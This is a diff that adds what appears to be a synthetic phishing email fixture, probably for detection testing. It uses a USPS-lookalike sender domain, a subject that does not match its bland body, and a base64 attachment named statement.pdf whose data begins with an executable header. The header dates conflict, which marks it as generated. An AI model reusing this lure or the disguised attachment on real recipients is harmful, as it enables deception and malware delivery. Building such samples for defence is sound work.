@@ -1,0 +1,46 @@
+From: notice@usps-tracking.icu
+To: victim51@example.com
+Subject: Power outage maintenance window [ref A0ECEB7]
+Date: Tue, 03 Mar 2002 04:18:00 -0500
+Message-ID: <phish-231-a44a4dd6-b9de-4003-9afc-c44b343f1038@usps-tracking.icu>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 04 Mar 2002 09:34:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 28 Mar 2002 07:25:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 22 Mar 2002 00:03:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 23 Mar 2002 13:20:00 -0500
+Return-Path: <notice@usps-tracking.icu>
+Reply-To: notice@usps-tracking.icu
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=usps-tracking.icu; dkim=pass header.d=usps-tracking.icu; dmarc=pass header.from=usps-tracking.icu
+Received-SPF: pass (mx.example.com: domain of notice@usps-tracking.icu designates 192.0.2.51 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=usps-tracking.icu; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-231-8895808a"
+
+--bnd-p-231-8895808a
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: A0ECEB7
+
+Thanks,
+Colleague
+--bnd-p-231-8895808a
+Content-Type: application/pdf; name="statement.pdf"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="statement.pdf"
+
+TVqQAGO1VkcPq6LSbDcYLPSYiC6AHvNEeqcTMEQ6EV+WCkGNA7f8pUR0hwwl2vzigD8E1NQP96m6
+cEmsjtIoTvAr/Gpn7hbXm/uCmO15Qb4vmLno7+DOGzWkdHjkS1IBCUYUBly2hFG5bDI3mxJg2O/W
+kLKK45Gqgy8hYjPXnOMcvwd+Sg90hUB/nvSk6n7zTbjNtypNBMEuiasZcr1e1OhHmbMawdOU68qC
+jRtaQ9SZathHWro9XoO0XKE3pROO1IRHaVdvwCm3iuYTgsFTz7EL7ltU+I2msQEdOHBBGYcLmt4D
+Di6M75aFkjL8AvEj/mFIPLaFKl+zIEsptM/P1vgj00LtErYvMWrQuGEqRYsfMECKqUkjzYr4DRmu
+8qOetw3OpBwvcQM2PQy6rKHAlr294QYPAhlpP8jROS1oeW/03uTHUpcxuLZQvv8/eTU+Df1utyLy
+Of85EVL1SBX/MbDrD2Ks1bPICEEwC49dAkGC6GXXGUX+rFbLt4gq52YOfO1TU7tWGfXHfpxhqY70
+vSh2bx1KpTw5X19LC+8V+dqYhBs5VFh9D0vaE34Qfj+HLsfHyEKX41w670FxJjkigYYjUR+byJPI
+QKfI9HuIH8gd9ZgKYgUWV3RhFfJuvk7whuSducebyUG/0yNH9TaqXD4K0D1zhf97krj9a64nNQSB
+yWi0LyhwoHibM+3OrjFtpqPjabvb6Qe0NfYrbrgQ+uDbCZYC7Wtbaj3sDvis3NB3uw2ZDDIf7f69
+27fI7CnZ0MKvrE9a3JelM8RkMZ3drM0hfIpSjRL0VRIa9XtKVmlzOHuNuQ9hLZl9GtqZTMnRzxD7
+ICDyP7/kRHxVmRPWHA==
+
+--bnd-p-231-8895808a--
